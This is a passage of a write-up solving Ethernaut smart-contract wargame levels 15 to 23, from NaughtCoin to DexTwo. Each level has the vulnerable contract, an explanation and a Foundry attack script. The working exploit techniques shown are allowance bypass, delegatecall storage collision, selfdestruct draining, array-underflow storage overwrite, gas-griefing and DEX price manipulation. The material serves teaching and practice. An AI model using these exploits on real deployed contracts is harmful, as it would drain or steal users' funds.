// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin-contracts/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 

```

- Goal

1. NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

- Solution

1. NaughtCoin imports ERC20 contract. So, it consists of all the function of ERC20 contract also.
2. NaughtCoin only implemented the `lockTokens()` modifier on `transfer()` function only.
3. There are other ways to transfer tokens from one address to other without using `transfer()`
4. Player can approve the allowances of their tokens to someone, and they can use `transferFrom()` function to transfer tokens on behalf of player.

`NaughtCoinSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract NaughtCoinSolve is Script{
    NaughtCoin public naughtCoin = NaughtCoin(0xE4497348f2557Bb7Ecb4631426a0c2d880BE0497);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address player = address(naughtCoin.player());
        uint playerBalance = naughtCoin.balanceOf(player);
        console.log("Player : ", player);
        console.log("Player Balance : ", playerBalance);
        
        Attack attack = new Attack();
        console.log("Attack Address : ", address(attack));
        
        naughtCoin.approve(address(attack), playerBalance);

        attack.exploit(player);

        console.log("Player : ", player);
        console.log("Player Balance : ", naughtCoin.balanceOf(player));
        console.log("Attacker Balance : ", naughtCoin.balanceOf(address(attack)));

        vm.stopBroadcast();
    }
}

contract Attack{
    NaughtCoin public naughtCoin = NaughtCoin(0xE4497348f2557Bb7Ecb4631426a0c2d880BE0497);

    function exploit(address _player) public {
        
        require(naughtCoin.allowance(_player, address(this)) > 0, "Not approved yet");

        require(naughtCoin.transferFrom(_player, address(this), naughtCoin.balanceOf(_player)), "Transfer to Atacker Failed");
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/NaughtCoinSolve.s.sol:NaughtCoinSolve --rpc-url $RPC_URL --broadcast
```

# 16 Preservation

`Preservation.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

- Goal 

1. The goal of this level is for you to claim ownership of the instance you are given.

- Solution

1. Preservation contract uses LibraryContract to set the time in the Preservation contract by using `delegatecall`.
2. As we know `delegatecall` runs the call in the context of the calle contract and updates the storage of the caller contract.
3. So, the caller and callee contract storage layout should be matched. If not it may result in storage collision bugs.
4. Here the Preservation contract doesn't matches the LibraryContract storage layout. 
5. I observed that calling `setSecondTime` updates the `timeZone1Library` address in the Preservation contract.
6. By exploiting this we can write our own attacker contract that implements the `setTime()` function and pass that address to the `setSecondTime()` function so that it will updte the `timeZone1Library` address in the Preservation contract.
7. I implemented the Attack contract in such a way that it matches the Preservation storage layout and instead of updating the `stiredTime` i updated the `owner`. And that makes our attack contract as the owner of the Preservation contract.

`PreservationSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Preservation} from "../src/Preservation.sol";

contract PreservationSolve is Script{
    Preservation public preservation = Preservation(0x67403A5bC365868E3f9800c6308ca3623Bb1e446);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("timeZone1Library Address : ", preservation.timeZone1Library());
        console.log("timeZone2Library Address : ", preservation.timeZone2Library());
        console.log("Owner : ", preservation.owner());
        
        Attack attack = new Attack();
        console.log("Attack Address : ", address(attack));
        

        attack.exploit();


        console.log("timeZone1Library Address : ", preservation.timeZone1Library());
        console.log("timeZone2Library Address : ", preservation.timeZone2Library());
        console.log("Owner : ", preservation.owner());

        vm.stopBroadcast();
    }
}

contract Attack{
    // matching Preservation Storage Layout
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;


    function exploit() public {
        Preservation preservation = Preservation(0x67403A5bC365868E3f9800c6308ca3623Bb1e446);
        uint attacker = uint(uint160(address(this)));
        preservation.setSecondTime(attacker); // updating timeZone1Library address;

        preservation.setFirstTime(1);

    }
    function setTime(uint _time) public {
        // owner = address(uint160(_time));
        owner = address(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602);
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/PreservationSolve.s.sol:PreservationSolve --rpc-url $RPC_URL --broadcast
```


# 17 Recovery

`Recovery.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

- Goal

1. This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

- Solution

1. The SimpleToken contract is funded with 0.001 ether. We need to drain those ether.
2. To drain ether we can simply call the `destroy()` function of the SimpleToken contract.
3. But we dont have the address of the SimpleToken. We can user ETHERSCAN to identify the transaction of Recovery contract to find the address of the SimpleToken.
4. We can also use a formula that is mentioned in ethereum yellow paper about how a newly created contract address will be computed.
5. The formula is `address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))))`
5. `0xd6` and `0x94` are constants and the last byte1 is the nonce, i.e, number contracts created from the existed contract. We assume that its one.
6. By this formula we can recover the SimpleToken address and call the `destroy()` function to drain all ether.

`RecoverySolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Recovery} from "../src/Recovery.sol";

contract RecoverySolve is Script{
    Recovery public recovery = Recovery(0xb85de0D636d9C15Be34104D65A9eE406001463bE);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address myAddress = address(vm.envAddress("MY_ADDRESS"));
        
        Attack attack = new Attack();
        console.log("Attack Address : ", address(attack));
        console.log("MY Balance : ", myAddress.balance);
        
        address _creator = address(recovery);

        address token = attack.exploit(_creator, payable(myAddress));
        
        console.log("Token Address : ", token);
        console.log("MY Balance : ", myAddress.balance);

        vm.stopBroadcast();
    }
}

contract Attack{
    function exploit(address _creator, address payable _myAddress) public returns(address){
        address missedToken = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))));

        missedToken.call(abi.encodeWithSignature("destroy(address)", _myAddress));

        return missedToken;
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/RecoverySolve.s.sol:RecoverySolve --rpc-url $RPC_URL --broadcast
```


# 18 Magic Number

`MagicNum.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {

  address public solver;

  constructor() {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}
```

- Goal 

1. To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. But the solver contract should be very small at most 10 OPCODES.

- Solution

1. To solve this challenge we need to write a contract that return 42. But the contract should be written with at most 10 OPCODES.
2. We need write our contract in Assembly not in solidity, so that we can build very tiny contract with less OPCODES.
3. Then we can convert it into bytecode and deploy onto blockchain and then pass the address to the `setSolver()` function.
4. Bytecodes are divided into two main types in solidity. 
    1. Runtime bytecode
    2. Creation bytecode
5. Runtime bytecode will be stored on blockchain and executes when a call happens
6. Creation code consist of **init data**, **runtime data** and **constructor bytecode**. We need to create a runtime code which returns 42 upon call and append it with some init data which is required to deploy a contract.

```
 Create a RUNTIME BYTECODE which returns 42 
 PUSH1 0x2a --> pushing 42 into stack
 PUSH1 0x00
 MSTORE --> Stores 0x2a at 0x00 location
 
 PUSH 0x20  --> pushing 32 into stack
 PUSH 0x00  
 RETURN  --> returns value at 0x00 to 0x20 in memory
 
 ---> Combining this will be runtime code : 602a60005260206000f3
```

```
 // Creating Creation code
 
 PUSH10 0x602a60005260206000f3
 PUSH 0x00
 MSTORE  --> Stores runtime bytecode at 0x00 in memory 

 PUSH 0x0a  --> push 10 into memory : Length of the run time code
 PUSH 0x16  --> push 22 into memory : Offset position
   // MSTORE stores 0x0000000000000000000000602a60005260206000f3 
 RETURN
 
 ---> Creation Code : 69602a60005260206000f3600052600a6016f3
```
We can use this creation code to deploy a contract using `create` opcode and pass the address of the deployed contract to `setSolver()`.

`MagicNumSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {MagicNum} from "../src/MagicNum.sol";

contract MagicNumSolve is Script{

    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack().exploit();
        vm.stopBroadcast();
    }

}

contract Attack{
    MagicNum public magicNum = MagicNum(0x396D3C79ecde0C91F14562d41ecf0F7685016b65);
    function exploit() public{
       bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
       address _solver;
        // create(value, offset, size)
       assembly {
        _solver:= create(0, add(bytecode, 0x20), 0x13)
       }
       require(_solver != address(0));
       magicNum.setSolver(_solver);
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/MagicNumSolve.s.sol:MagicNumSolve --rpc-url $RPC_URL --broadcast
```


# 19 Alien Codex

`AlienCodex.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0; 


import './helpers/Ownable-05.sol';

contract AlienCodex is Ownable{

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

`Ownable-05.sol`

```javascript
contract Ownable {
    address private _owner;

    /*
    Remaining code......
    */
}

```

- Goal

1. Claim ownership to complete the level.

- Solution

1. First thing to note is the challenge contract uses pragma `0.5.0`, so it prone to integer overflow/underflows.
2. To call any function on the contract we need to call the `makeContact()` function initially.
3. Observe that `codex` is a dynamic bytes32 array. Recall how dynamic arrays stored in storage layout. 
4. AlineCodex inherits the Ownable contract which has the state variable `owner`. It will be stored at slot 0 combined with `contacted` variable.
4. Here, in the slot 1 the legth of the `codex` array will be stored and it will be updated whenever a new element is pushed onto the array.
5. AleinCodex also changes the length of the `codex` with `retract()` function.
6. `revise()` method allows us to modify any existing element of the `codex` array. Keep in mind that each element will stored at different storage slot.
7. Initially the length of the `codex` is 0. If we call the `retract()` it will be `0 - 1` which results in underflow and stores the value **`2**256 - 1`** as the length . It is the maximum storage slot index of a contract in ethereum.
8. So, now the codex array has access to all the storage slots of the contract. We can use this to update the `owner` value which is stored at the slot 0.
9. For this we need to find the index of the slot 0. Dynamic arrays finds the elements starting from the slot number `uint(keccak256(SLOT_NUMBER_OF_LENGTH))`. So, the `codex` array elements starts from the slot `uint(keccak256(1))`.
```
 codex[0] ==> codex[keccack256(1)]  ==> slot keccack256(1)
 codex[1] ==> codex[keccack256(1)+1]  ==> slot keccack256(1)+1
```
10. We need to find the index of the slot 0. We can do this by pointing our `codex` array to **`2**256`** index, which is not available and result in an overflow and will points back to the slot 0.
11. So, we need pass the `2**256 - keccack256(1)` to the `revise()` method it will find the index of the slot by using the same method
```
 codex[keccack256(1) + 2**256 - keccack256(1)] 
 codex[2**256] ==> slot 2**256 ==> slot 0 (overflow)
```
12. This will result a overflow and `revise()` method will modify the content of the owner slot that is zero.


`AlienCodexSolve.s.sol`


```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

import "forge-std/Script.sol";
import "forge-std/console.sol";
// import {AlienCodex} from "../src/AlienCodex.sol"; // Not using AlienCodex source contract because of old compiler dependency

contract AlienCodexSolve is Script{
    IAlienCodex public alienCodex = IAlienCodex(0x92FfB1bd2432d4F2EA1340209742a99FBbFD45d2);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes32 slot0 = vm.load(address(alienCodex), bytes32(uint(0)));
        console.logBytes32(slot0);  // contacted + owner

        alienCodex.makeContact();

        alienCodex.retract();  // 0 - 1 ==> (2**256) [underflow]

        // codex[0] ==> codex[keccack256(1)]  ==> slot keccack256(1)
        // codex[1] ==> codex[keccack256(1)+1]  ==> slot keccack256(1)+1

        // codex[2**256 - keccack256(1)]  ==> codex[keccack256(1) + 2**256 - keccack256(1)] 
        //                                ==> codex[2**256] ==> slot 2**256 ==> slot 0 (overflow)

        uint ownerSlot = (((2**256) - 1) - uint(keccak256(abi.encode(1))) + 1); 
        // uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 _content = bytes32(uint256(uint160(vm.envUint("MY_ADDRESS"))));
        alienCodex.revise(ownerSlot, _content);

        bytes32 slot0After = vm.load(address(alienCodex), bytes32(uint(0)));
        console.logBytes32(slot0After);  // contacted + owner

        vm.stopBroadcast();
    }
}
interface IAlienCodex {

  function makeContact() external;
  function record(bytes32 _content) external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;

}
```

To run script : 

```bash
$ source .env
$ forge script script/AleinCodexSolve.s.sol:AleinCodexSolve --rpc-url $RPC_URL --broadcast
```

# 20 Denial

`Denial.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

- Goal

1. Deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

- Solution

1. We should revert the call when the owner calls the `withdraw()` function. But if we do a simple revert in our contract fallback it won't work.
2. Because withdraw function doesn't check for the return value. 
3. One thing we can do is, drain the gas of the transaction that is sent by the owner. 
4. Call to partner is made by the `call` which will forward all the remaining gas to the external call. 
5. So, we can drain all the gas by writing a most expensive computation in Partner contract.
6. I have written an infinite loop inside the fallback of the Attack contract and registered the Attack contract as the partner in Denial contract.

`DenialSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Denial} from "../src/Denial.sol";

contract DenialSolve is Script{
    Denial public denial = Denial(payable(0x82091354dc7d529c2d52F4D99f7108630ECaE590));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Denial Balance : ", address(denial).balance);

        new Attack().exploit();
        
        vm.stopBroadcast();
    }
}

contract Attack{
    Denial public denial = Denial(payable(0x82091354dc7d529c2d52F4D99f7108630ECaE590));
    uint public x;

    function exploit() public {
        denial.setWithdrawPartner(address(this));
        // denial.withdraw();
    }
    fallback() external payable{
        for (uint i = 0; i>=0; i++){
            x = x + i;
        }
    }
}

```

To run script : 

```bash
$ source .env
$ forge script script/DenialSolve.s.sol:DenialSolve --rpc-url $RPC_URL --broadcast
```

# 21 Shop

`Shop.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

- Goal

1. Сan you get the item from the shop for less than the price asked?

- Solution

1. This is similar to the Elevator challenge. Elevator uses a an external normal function to call. 
2. But here `price()` should a view function. Which shouldn't modify the storage of the contract.
3. So, we cant just keep the number of the calls to the `price()` function in our Attack contract.
4. We can make use of `isSold` variable to check that the `price()` is called or not. This can be acceptable inside a view function. 
5. So, I wrote Attack contract with `price()` function defined as view and it returns two different price values for the initial call and second call. 

`ShopSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Shop} from "../src/Shop.sol";

contract ShopSolve is Script{
    Shop public shop = Shop(0x45e7A13038eCA7cCfd53aC8C4F345A7bC2fCd2A2);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("is Sold : ", shop.isSold());

        new Attack().exploit();

        console.log("is Sold : ", shop.isSold());        
        vm.stopBroadcast();
    }
}

contract Attack{
    Shop public shop = Shop(0x45e7A13038eCA7cCfd53aC8C4F345A7bC2fCd2A2);

    function exploit() public {
        shop.buy();
    }
    function price() external view returns (uint){
        if(shop.isSold() == false){
            return 100;
        }
        return 1;
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/ShopSolve.s.sol:ShopSolve --rpc-url $RPC_URL --broadcast
```

# 22 Dex

`Dex.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts/contracts/access/Ownable.sol';

contract Dex is Ownable(address(0x00)) {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

- Goal

1. The goal of this level is for you to hack the basic DEX contract and steal the funds by price manipulation.
2. You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

- Solution

1. You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
2. There is a `swap()` function inside Dex contract which swaps one token for another. Inside `swap()` intially two basic checks have been done to check for that the tokens are valid or not. And for the balance of the sender.
3. Observe that the `getSwapPrice()` is used to get the amount of tokens to be transferred to the `to` address.
```
  uint swapAmount = getSwapPrice(from, to, amount);
  IERC20(from).transferFrom(msg.sender, address(this), amount);
  IERC20(to).approve(address(this), swapAmount);
  IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
```
4. The `amount` is the amount of the tokens that added to the balance of `Dex` contract.
5. `swapAmount` is the amount of tokens that goes to the `to` address from the balance of the `Dex` contract.
6. I tried calculating for swapAmout to find is there any chance that happens for the `swapAmount > amount`. So, that the `to` address will get more tokens than they sent.
7. I have observed that swapping between two tokens slightly increases the balance of the `to` address.
 
   ```
    swap(token1, token2, 10)  
      swapAmount = (10 * 100)//100 = 10
      ==>  balance of player in token1 = 10 - amount = 0
      ==>  balance of player in token2 = 10 + swapAmount = 20
    
      ==>  balance of Dex in token1 = 110
      ==>  balance of Dex in token2 = 100 - swapAmount = 90

    swap(token2, token1, 20) 
      swapAmount  = (20 * 110) // 90 = 24
      ==>  balance of player in token2 = 20 - amount = 0
      ==>  balance of player in token1 = 0 + swapAmount = 24
    
      ==>  balance of Dex in token2 = 90 + amount
      ==>  balance of Dex in token1 = 110 - swapAmount = 110 - 24 = 86
    ```

8. Here you can see that the after each swap `swapAmount` is becoming greater than the amount the comes in.
9. After doing 5 swaps we need to do 45 amount of tokens swap from token2 to token1 which will make token2 balance of `Dex` zero.

`DexSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Dex} from "../src/Dex.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract DexSolve is Script{
    Dex public dex = Dex(0x13dC383F59782676f31c55baa715C6F24E4d8CF5);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address token1 = address(dex.token1());
        address token2 = address(dex.token2());

        console.log("Token 1 : ", token1);
        console.log("Token 2 : ", token2);

        console.log("DEX balance in TOKEN1 ", dex.balanceOf(token1, address(dex)));
        console.log("DEX balance in TOKEN2 ", dex.balanceOf(token2, address(dex)));

        Attack attack = new Attack();
        
        dex.approve(address(attack), 10);

        attack.exploit();

        console.log("Attacker balance in TOKEN1 ", dex.balanceOf(token1, address(attack)));
        console.log("Attacker balance in TOKEN2 ", dex.balanceOf(token2, address(attack)));

        console.log("DEX balance in TOKEN1 ", dex.balanceOf(token1, address(dex)));
        console.log("DEX balance in TOKEN2 ", dex.balanceOf(token2, address(dex)));
        vm.stopBroadcast();
    }
}

contract Attack{
    Dex public dex = Dex(0x13dC383F59782676f31c55baa715C6F24E4d8CF5);
    address token1 = dex.token1();
    address token2 = dex.token2();
    function exploit() public{
        IERC20(token1).transferFrom(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602, address(this), 10);
        IERC20(token2).transferFrom(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602, address(this), 10);
        
        dex.approve(address(dex), type(uint64).max);

        dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
        dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
        dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
        dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
        dex.swap(token1, token2, dex.balanceOf(token1, address(this)));

        dex.swap(token2, token1, 45);        
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/DexSolve.s.sol:DexSolve --rpc-url $RPC_URL --broadcast
```

# 23 Dex Two

`DexTwo.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts/contracts/access/Ownable.sol';

contract DexTwo is Ownable(address(0x00)) {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

- Goal

1. You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

- Solution

1. Observe that the `DexTwo` modifies the `swap()` function from the `Dex`. It removed the check of valid tokens. 
2. So, we are now allowed to input any token addresses to the swap() function.
3. I created two Fake Tokens and transferred 100 tokens each of the two tokens to the `Dex` address. 
4. I swapped my fake tokens with the `token1` and `token2` balances of the `Dex` contract.

`DexTwoSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Dex} from "../src/Dex.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";



contract DexTwoSolve is Script{
    Dex public dex = Dex(0xd8c665Dac001720A9efa0f478e63CABc5D64E9e9);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address token1 = address(dex.token1());
        address token2 = address(dex.token2());

        console.log("Token 1 : ", token1);
        console.log("Token 2 : ", token2);

        console.log("DEX balance in TOKEN1 ", dex.balanceOf(token1, address(dex)));
        console.log("DEX balance in TOKEN2 ", dex.balanceOf(token2, address(dex)));

        Attack attack = new Attack();
        
        // dex.approve(address(attack), 10);

        attack.exploit();

        console.log("Attacker balance in TOKEN1 ", dex.balanceOf(token1, address(attack)));
        console.log("Attacker balance in TOKEN2 ", dex.balanceOf(token2, address(attack)));

        console.log("DEX balance in TOKEN1 ", dex.balanceOf(token1, address(dex)));
        console.log("DEX balance in TOKEN2 ", dex.balanceOf(token2, address(dex)));
        vm.stopBroadcast();

    }
}

contract Attack{
    Dex public dex = Dex(0xd8c665Dac001720A9efa0f478e63CABc5D64E9e9);
    address token1 = dex.token1();
    address token2 = dex.token2();

    MyEvilToken myToken1;
    MyEvilToken myToken2;

    constructor(){
        myToken1 = new MyEvilToken();
        myToken2 = new MyEvilToken();
    }
    function exploit() public{
        // IERC20(token1).transferFrom(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602, address(this), 10);
        // IERC20(token2).transferFrom(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602, address(this), 10);
        
        myToken1.transfer(address(dex), 100);
        myToken2.transfer(address(dex), 100);


        myToken1.approve(address(dex), type(uint64).max);
        myToken2.approve(address(dex), type(uint64).max);

        dex.swap(address(myToken1), token1, dex.balanceOf(token1, address(dex)));
        dex.swap(address(myToken2), token2, dex.balanceOf(token2, address(dex)));
        
    }
}

contract MyEvilToken is ERC20("MyEVILToken", "EVIL"){
    constructor(){
        _mint(msg.sender, 10000);
    }
}
```

To run script : 

```bash
$ source .env
